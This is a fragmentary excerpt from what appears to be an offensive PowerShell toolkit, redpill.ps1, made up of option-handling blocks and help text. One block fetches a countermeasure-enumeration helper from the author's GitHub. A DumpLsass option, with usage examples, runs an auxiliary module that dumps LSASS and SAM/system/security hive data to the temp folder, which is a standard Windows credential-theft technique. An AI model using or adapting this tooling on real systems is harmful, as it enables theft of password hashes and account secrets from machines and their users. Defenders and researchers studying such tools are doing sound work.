...
If($GetCounterMeasures -ne "false"){
   ...
   If(-not(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1")){## Download GetCounterMeasures.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 78){## Corrupted download detected => DefaultFileSize: 78,91796875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
...
If($DumpLsass -ne "false"){
   ...
   .Parameter Storage
      Where to store metadata (default: $Env:TMP)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass true
      Dump metadata to %tmp% directory

   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass true -Storage "$Env:TMP"
      Dump metadata to %tmp% directory
   ...
   ## Run auxiliary module
   Powershell -File "$Env:TMP\DumpLsass.ps1" -Storage $Storage
...
$HelpParameters = @"
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass true -storage "`$Env:TMP"
      Dump sam\system\security metadata to %tmp% directory
